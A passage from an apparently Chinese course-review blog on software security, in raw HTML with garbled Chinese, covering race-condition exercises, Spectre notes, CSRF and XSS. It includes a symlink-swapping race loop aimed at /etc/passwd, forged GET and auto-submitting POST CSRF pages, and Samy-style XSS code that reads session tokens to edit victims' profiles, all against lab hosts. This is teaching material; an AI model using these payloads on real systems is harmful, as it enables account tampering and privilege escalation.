class="type">int</span> <span class="title function_">main</span><span class="params">()</span> </span><br><span class="line">{</span><br><span class="line">   <span class="keyword">while</span>(<span class="number">1</span>) {</span><br><span class="line">     unlink(<span class="string">"/tmp/XYZ"</span>);  <span class="comment">// åˆ é™¤å·²æœ‰é“¾æ¥                     </span></span><br><span class="line">     symlinkå†…å®¹æ˜¯ï¼ˆ(<span class="string">"ï¼‰/dev/nullæ–‡ä»¶çš„è·¯å¾„"</span>, <span class="string">"/tmp/XYZ"</span>);   </span><br><span class="line">       <span class="comment">// åˆ›å»ºæ–°çš„é“¾æ¥ï¼šè®©/tmp/XYZæ–‡ä»¶çš„å†…å®¹æ˜¯ï¼ˆæŒ‡å‘ï¼‰/dev/nullæ–‡ä»¶çš„è·¯å¾„</span></span><br><span class="line">     usleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">     unlink(<span class="string">"/tmp/XYZ"</span>);                       </span><br><span class="line">     symlink(<span class="string">"/etc/passwd"</span>, <span class="string">"/tmp/XYZ"</span>);       </span><br><span class="line">     usleep(<span class="number">1000</span>);</span><br><span class="line">   }</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h3 id="ç»ƒä¹ -2"><a href="#ç»ƒä¹ -2" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p><strong>é—®é¢˜</strong>ï¼šå…³äºæ˜¯å¦å­˜åœ¨race condition problemçš„åˆ¤æ–­ã€‚</p>
<p>ï¼ˆ1ï¼‰å¦‚æœä½¿ç”¨è‡ªå®šä¹‰çš„ <code>faccess(fd, mode)</code>ï¼ˆåŸºäº<strong>æ–‡ä»¶æè¿°ç¬¦</strong>æ£€æŸ¥æƒé™ï¼‰ï¼Œä¸‹é¢çš„ç¨‹åºæœ‰ç«äº‰æ¡ä»¶å—ï¼Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> f = open(<span class="string">"/tmp/x"</span>, O_WRITE);</span><br><span class="line"><span class="keyword">if</span> (!faccess(f, W_OK)) {</span><br><span class="line">	write_to_file(f)</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">	close(f);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>æ²¡æœ‰</strong>ç«äº‰æ¡ä»¶æ¼æ´ã€‚ç«äº‰æ¡ä»¶çš„æ ¹æºåœ¨äºâ€œæ£€æŸ¥çš„å¯¹è±¡â€å’Œâ€œä½¿ç”¨çš„å¯¹è±¡â€ä¸ä¸€è‡´ï¼ˆå› ä¸ºæ–‡ä»¶ååˆ°æ–‡ä»¶å®ä½“/inodeçš„æ˜ å°„å¯èƒ½é€šè¿‡<strong>è½¯é“¾æ¥</strong>åœ¨ä¸­é—´æ”¹å˜ï¼‰ã€‚ä½†æ˜¯åœ¨æ­¤ä»£ç ä¸­ï¼Œ<code>open</code> å…ˆæ‰§è¡Œï¼Œè·å¾—æ–‡ä»¶æè¿°ç¬¦ <code>f</code>ã€‚æ­¤æ—¶ï¼Œ<strong>æ–‡ä»¶å®ä½“/inodeå·²ç»è¢«é”å®šåœ¨ <code>f</code> ä¸­</strong>ã€‚éšå <code>faccess(f)</code> æ£€æŸ¥çš„æ˜¯<strong>åŒä¸€ä¸ª</strong>æ–‡ä»¶æè¿°ç¬¦ <code>f</code> æ‰€å¯¹åº”çš„æƒé™ï¼ˆä¸å†å—â€/tmp/xâ€è¿™ä¸ªæ–‡ä»¶åå†…å®¹çš„å½±å“ï¼‰ã€‚<strong>æ£€æŸ¥å’Œä½¿ç”¨çš„ä¸€è‡´æ€§å¾—åˆ°äº†ä¿è¯</strong>ã€‚</p>
</blockquote>
<p>ï¼ˆ2ï¼‰å°æµ‹é¢˜ã€‚</p>
<p>ï¼ˆ3ï¼‰ä¸‹é¢çš„ç¨‹åºæœ‰ç«äº‰æ¡ä»¶å—ï¼Ÿ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">statbuf</span>;</span></span><br><span class="line">    <span class="type">uid_t</span> real_uid;</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="comment">// /tmp/XYZæŒ‡å‘/etc/shadow</span></span><br><span class="line">    fp = fopen(<span class="string">"/tmp/XYZ"</span>, <span class="string">"a+"</span>);</span><br><span class="line">    <span class="comment">// /tmp/XYZæŒ‡å‘/dev/null</span></span><br><span class="line">    stat(<span class="string">"/tmp/XYZ"</span>, &amp;statbuf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The file ownerâ€™s user ID: %d\n"</span>, statbuf.st_uid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"The processâ€™s real user ID: %d\n"</span>, getuid());</span><br><span class="line">    <span class="comment">// Check whether the file belongs to the user</span></span><br><span class="line">    <span class="keyword">if</span> (statbuf.st_uid == getuid()) {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"IDs match, continue to write to the file.\n"</span>);</span><br><span class="line">    <span class="comment">// write to the file ...</span></span><br><span class="line">    <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"IDs do not match, exit.\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp) fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>ï¼ˆ4ï¼‰å¦‚æœæ”¹æˆè¿™æ ·å‘¢ï¼š<code>fp = fopen("/tmp/XYZ", "a+"); fstat(fileno(fp), &amp;statbuf);</code></p>
<blockquote>
<p>è¿™æ ·å°±æ²¡æœ‰äº†ã€‚æ³¨æ„ <code>fstat</code> æ£€æŸ¥çš„æ˜¯<strong>ç”±æ–‡ä»¶æè¿°ç¬¦ï¼ˆ<code>fileno(fp)</code>ï¼‰å¼•ç”¨çš„æ–‡ä»¶çš„å…ƒæ•°æ®</strong>ï¼Œè€Œä¸æ˜¯æ–‡ä»¶è·¯å¾„ã€‚</p>
</blockquote>
<p><strong>é—®é¢˜</strong>ï¼šrace condition æ¬¡æ•°åˆ¤æ–­ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat1</span>, <span class="title">stat2</span>;</span></span><br><span class="line"><span class="type">int</span> fd1, fd2;</span><br><span class="line">    <span class="comment">// æ”»å‡»å‰å…ˆæŠŠ/tmp/XYZæŒ‡å‘/etc/passwd</span></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">"/tmp/XYZ"</span>, O_RDWR)) {</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Permission denied\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="comment">// ç¬¬1æ¬¡è¿…é€Ÿåˆ‡æ¢</span></span><br><span class="line"><span class="keyword">else</span> fd1 = open(<span class="string">"/tmp/XYZ"</span>, O_RDWR);</span><br><span class="line">    <span class="comment">// ç¬¬2æ¬¡è¿…é€Ÿåˆ‡æ¢</span></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">"/tmp/XYZ"</span>, O_RDWR)) {</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Permission denied\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br><span class="line">    <span class="comment">// ç¬¬3æ¬¡è¿…é€Ÿåˆ‡æ¢</span></span><br><span class="line"><span class="keyword">else</span> fd2 = open(<span class="string">"/tmp/XYZ"</span>, O_RDWR);</span><br><span class="line"><span class="comment">// The program then checks whether fd1 and fd2 refer to the same file, if so, the program will write to fd1 (or fd2). Otherwise, the program will do nothing and exit.</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ä¸€å…±3æ¬¡ã€‚</p>
</blockquote>
<p><strong>é—®é¢˜ï¼š</strong> ä½¿ç”¨æœ€å°æƒé™åŸåˆ™ (Least Privilege) ä¿®å¤ä»£ç ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">seteuid(getuid());  <span class="comment">// æƒé™é™çº§</span></span><br><span class="line"><span class="keyword">if</span> (access(<span class="string">"/tmp/XYZ"</span>, W_OK) == ACCESS_ALLOWED) {</span><br><span class="line">    f = open(<span class="string">"/tmp/XYZ"</span>, O_WRITE);</span><br><span class="line">    write_to_file(f);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span> {</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Permission denied\n"</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<h2 id="ç†”æ–­æ”»å‡»"><a href="#ç†”æ–­æ”»å‡»" class="headerlink" title="ç†”æ–­æ”»å‡»"></a>ç†”æ–­æ”»å‡»</h2><p>æ„Ÿè§‰ä¸å¤ªä¼šè€ƒï¼Œç•¥å»ã€‚</p>
<h2 id="å¹½çµæ”»å‡»"><a href="#å¹½çµæ”»å‡»" class="headerlink" title="å¹½çµæ”»å‡»"></a>å¹½çµæ”»å‡»</h2><h3 id="çŸ¥è¯†å†…å®¹-3"><a href="#çŸ¥è¯†å†…å®¹-3" class="headerlink" title="çŸ¥è¯†å†…å®¹"></a>çŸ¥è¯†å†…å®¹</h3><p><img src="/2025/11/19/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E6%8E%A8%E7%90%86/%E5%A4%A7%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80%E7%AE%97%E5%AD%90/mage-20251223192929286.png"></p>
<p>æ”»å‡»æ–¹æ³•æ³¨æ„ç‚¹ï¼š</p>
<ul>
<li>æ³¨æ„1ï¼šéœ€è¦å…ˆåœ¨ç¼“å­˜ä¸­åˆ·æ‰sizeå˜é‡ï¼Œè¿™æ ·CPUå› ä¸ºæ— æ³•ç«‹å³åˆ¤æ–­<code>x &lt; size</code>ï¼Œæ‰ä¼šè¿›è¡Œåˆ†æ”¯é¢„æµ‹ï¼</li>
</ul>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/image-20251221200611583.png"></p>
<ul>
<li>æ³¨æ„2ï¼š<strong>å–å‡ºçš„ç§˜å¯†å€¼åº”å½“æ”¾åˆ°ä½œä¸ºindexæ”¾åˆ°arrayä¸­</strong>ï¼ˆåœ¨CPUåšå‡ºæ­£ç¡®åˆ¤æ–­ä¹‹å‰ï¼‰ï¼Œè¿™æ ·æ‰å¯ä»¥åœ¨ç¼“å­˜ä¸­æ‰¾åˆ°<code>array[secret*4096 + delta]</code>ã€‚</li>
</ul>
<p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/image-20251221201538500.png"></p>
<h4 id="åŸºäºç»Ÿè®¡æ–¹æ³•"><a href="#åŸºäºç»Ÿè®¡æ–¹æ³•" class="headerlink" title="åŸºäºç»Ÿè®¡æ–¹æ³•"></a>åŸºäºç»Ÿè®¡æ–¹æ³•</h4><p>å°±æ˜¯åˆ›å»º<code>score[k]</code>ï¼Œç»Ÿè®¡æ¯ä¸ª<code>k</code>è¢«â€œæ¿€æ´»â€çš„æ¬¡æ•°ï¼Œä»¥æ­¤æ¥çº¦å®šç§˜å¯†å€¼ã€‚</p>
<blockquote>
<p><strong>è®­ç»ƒé˜¶æ®µçš„å‰¯ä½œç”¨</strong>ï¼š<code>array[0*4096 + DELTA]</code> æ€»æ˜¯å‡ºç°åœ¨ç¼“å­˜ä¸­ã€‚ç»Ÿè®¡çš„æ—¶å€™éœ€è¦æ’é™¤ã€‚</p>
</blockquote>
<h3 id="ç»ƒä¹ -3"><a href="#ç»ƒä¹ -3" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p><strong>é—®é¢˜ï¼š</strong> æ•°ç»„å¤§å° 1024 å­—èŠ‚ï¼ŒCache Line å¤§å° 128 å­—èŠ‚ã€‚åˆ©ç”¨ Flush+Reload èƒ½å‘é€å¤šå°‘ä¸ªä¸åŒçš„å€¼ï¼Ÿ</p>
<blockquote>
<p>1024/128 = 8ä¸ªã€‚</p>
</blockquote>
<h2 id="WEBåŸºç¡€"><a href="#WEBåŸºç¡€" class="headerlink" title="WEBåŸºç¡€"></a>WEBåŸºç¡€</h2><p>æ„Ÿè§‰ä¸æ˜¯å¾ˆé‡è¦ï¼ŒåŸºæœ¬æ‰«ä¸€çœ¼å°±å¥½äº†ã€‚</p>
<h2 id="è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰"><a href="#è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰" class="headerlink" title="è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰"></a>è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼ˆCSRFï¼‰</h2><h3 id="çŸ¥è¯†å†…å®¹-4"><a href="#çŸ¥è¯†å†…å®¹-4" class="headerlink" title="çŸ¥è¯†å†…å®¹"></a>çŸ¥è¯†å†…å®¹</h3><p><img src="/2025/12/20/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/%E5%A4%8D%E4%B9%A0/CSRF_Attack_chinese.png"></p>
<h4 id="GETè¯·æ±‚æ”»å‡»"><a href="#GETè¯·æ±‚æ”»å‡»" class="headerlink" title="GETè¯·æ±‚æ”»å‡»"></a>GETè¯·æ±‚æ”»å‡»</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>This page forges an HTTP GET request.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.seed-server.com/action/friends/add?friend=42"</span> </span></span><br><span class="line"><span class="tag">       <span class="attr">alt</span>=<span class="string">"image"</span> <span class="attr">width</span>=<span class="string">"1"</span> <span class="attr">height</span>=<span class="string">"1"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>img</code> æ ‡ç­¾å°†è‡ªåŠ¨è§¦å‘ä¸€ä¸ª HTTP GETè¯·æ±‚ï¼šå½“æµè§ˆå™¨çœ‹åˆ° <code>img</code> æ ‡ç­¾æ—¶ï¼Œå®ƒä¼šè‡ªåŠ¨<strong>å‘ç”± <code>src</code> å±æ€§æŒ‡å®šçš„ URL å‘é€ä¸€ä¸ª HTTP GET è¯·æ±‚</strong>ï¼ˆè·¨ç«™è¯·æ±‚ï¼‰ã€‚æˆ‘ä»¬åœ¨æ¶æ„ç½‘ç«™ <a target="_blank" rel="noopener" href="http://www.attacker32.com/">www.attacker32.com</a> ä¸Šæ”¾ä¸Šåˆ¶ä½œå¥½çš„ç½‘é¡µï¼Œè¯¥ç½‘ç«™ç”±æ”»å‡»è€… Samy æ§åˆ¶ã€‚</p>
<h4 id="POSTè¯·æ±‚"><a href="#POSTè¯·æ±‚" class="headerlink" title="POSTè¯·æ±‚"></a>POSTè¯·æ±‚</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>This page forges an HTTP POST request.<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">function forge_post()</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">{</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  var fields;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields = "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'name'</span> <span class="attr">value</span>=<span class="string">'Alice'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'description'</span></span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">                                  <span class="attr">value</span>=<span class="string">'SAMY is MY HERO'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'accesslevel[description]'</span> </span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="language-handlebars">                                  <span class="attr">value</span>=<span class="string">'2'</span>&gt;</span>"; </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  fields += "<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'guid'</span> <span class="attr">value</span>=<span class="string">'39'</span>&gt;</span>";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  var p = document.createElement("form");  </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.action = "http://www.seed-server.com/action/profile/edit";</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.innerHTML = fields;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.method = "post";  </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  document.body.appendChild(p); </span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  p.submit();</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">}</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">window.onload = function() { forge_post();}</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="åŒç«™-cookie"><a href="#åŒç«™-cookie" class="headerlink" title="åŒç«™ cookie"></a>åŒç«™ cookie</h4><p>æ·»åŠ  SameSite å±æ€§çš„cookieã€‚<strong>è¯¥å±æ€§ç”±æœåŠ¡å™¨è¿›è¡Œè®¾ç½®ï¼Œå®ƒå‘Šè¯‰æµè§ˆå™¨ cookie æ˜¯å¦å¯ä»¥è¢«è·¨ç«™è¯·æ±‚ä½¿ç”¨</strong>ã€‚</p>
<ul>
<li><p>æ²¡æœ‰æ­¤å±æ€§çš„ cookie ä¼šè¢«é™„åŠ åˆ°æ‰€æœ‰çš„è¯·æ±‚ä¸Šã€‚</p>
</li>
<li><p>æ‹¥æœ‰æ­¤å±æ€§çš„ cookie ä¼šè¢«é™„åŠ åˆ°åŒç«™è¯·æ±‚ä¸Šï¼Œ<strong>è‡³äºå®ƒæ˜¯å¦ä¼šé™„åŠ åˆ°è·¨ç«™è¯·æ±‚ä¸Šå–å†³äºè¯¥å±æ€§çš„å…·ä½“å€¼</strong>ã€‚Samesite å±æ€§å¯ä»¥æœ‰ä¸¤ä¸ªå€¼ï¼š <code>Strict</code> å’Œ <code>Lax</code>ã€‚</p>
<ul>
<li><code>Strict</code> ç±»å‹çš„ Cookie å®Œå…¨ä¸ä¼šè¢«å‘é€ï¼›</li>
<li>å¯¹äº POST è¯·æ±‚ï¼Œ<code>Lax</code> ç±»å‹çš„ Cookie ä¸ä¼šè¢«å‘é€ï¼›</li>
<li>å¯¹äº GET è¯·æ±‚ï¼Œ<code>Lax</code> ç±»å‹çš„ Cookie ä»…åœ¨ GET è¯·æ±‚å¼•å‘é¡¶çº§å¯¼èˆªæ—¶æ‰ä¼šè¢«å‘é€ï¼ˆé€šå¸¸ä¸å‘ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<p>è¿™æ ·ï¼Œè¿œç«¯ï¼ˆåç«¯ï¼‰æœåŠ¡å™¨å°±å¯ä»¥çŸ¥é“è¯·æ±‚æ˜¯å¦æ˜¯è·¨ç«™è¯·æ±‚ï¼Œä»è€Œé˜²å¾¡æ­¤æ”»å‡»ï¼</p>
<h3 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><h2 id="è·¨ç«™è„šæœ¬æ”»å‡»"><a href="#è·¨ç«™è„šæœ¬æ”»å‡»" class="headerlink" title="è·¨ç«™è„šæœ¬æ”»å‡»"></a>è·¨ç«™è„šæœ¬æ”»å‡»</h2><p>æœ¬è´¨æ˜¯æŠŠæ¶æ„ä»£ç æ³¨å…¥åˆ°ç½‘ç«™ï¼Œåˆ«äººè®¿é—®ç½‘ç«™çš„æ—¶å€™ï¼Œå°±ä¼šä¸‹è½½åˆ°æ¶æ„ä»£ç ä»è€Œè¢«æ”»å‡»ã€‚å®é™…ä¸Šæ˜¯åŒç«™è¯·æ±‚ï¼</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>){</span><br><span class="line">  <span class="keyword">var</span> guid  = <span class="string">"&amp;guid="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">  <span class="keyword">var</span> ts    = <span class="string">"&amp;__elgg_ts="</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>; </span><br><span class="line">  <span class="keyword">var</span> token = <span class="string">"&amp;__elgg_token="</span> + elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">  <span class="keyword">var</span> name  = <span class="string">"&amp;name="</span> + elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">  <span class="keyword">var</span> desc  = <span class="string">"&amp;description=Samy is my hero"</span> +            </span><br><span class="line">              <span class="string">"&amp;accesslevel[description]=2"</span>;      </span><br><span class="line"></span><br><span class="line">  <span class="comment">// Construct the content of your url.</span></span><br><span class="line">  <span class="keyword">var</span> sendurl = <span class="string">"http://www.seed-server.com/action/profile/edit"</span>;</span><br><span class="line">  <span class="keyword">var</span> content = token + ts + name + desc + guid;     </span><br><span class="line">  <span class="keyword">if</span> (elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span> != <span class="number">47</span>){                    ğŸ…°</span><br><span class="line">    <span class="comment">// Create and send Ajax request to modify profile </span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">    <span class="title class_">Ajax</span> = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">"POST"</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">"Content-Type"</span>,</span><br><span class="line">                          <span class="string">"application/x-www-form-urlencoded"</span>);</span><br><span class="line">    <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">  } </span><br><span class="line">} </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„åœ¨è¡Œ ğŸ…° æˆ‘ä»¬åšäº†ä¸ªåˆ¤æ–­ï¼Œæ£€æŸ¥ç›®æ ‡ç”¨æˆ·æ˜¯ä¸æ˜¯ Samy è‡ªå·±ï¼Œå¦‚æœæ˜¯çš„è¯ï¼Œå°±ä¸åšæ”»å‡»ã€‚è¿™ä¸ªåˆ¤æ–­å¾ˆé‡è¦ï¼Œå¦‚æœæ²¡æœ‰çš„è¯ï¼Œå½“ Samy åˆšæŠŠæ”»å‡»ä»£ç æ”¾å…¥ä»–è‡ªå·±çš„ä¸ªäººä¸»é¡µåï¼Œæ”¹è¿‡çš„ä¸»é¡µä¼šç«‹åˆ»æ˜¾ç¤ºå‡ºæ¥ï¼Œå¯¼è‡´ä¸»é¡µä¸­çš„æ”»å‡»ä»£ç ç«‹åˆ»å¾—åˆ°æ‰§è¡Œï¼ŒæŠŠ Samy ä¸»é¡µå†…å®¹æ”¹æˆäº† â€œSamy is my heroâ€ã€‚åŸæ¥æ”¾åœ¨é‡Œé¢çš„æ”»å‡»ä»£ç å°±è¢«è¦†ç›–æ‰äº†ã€‚</p>
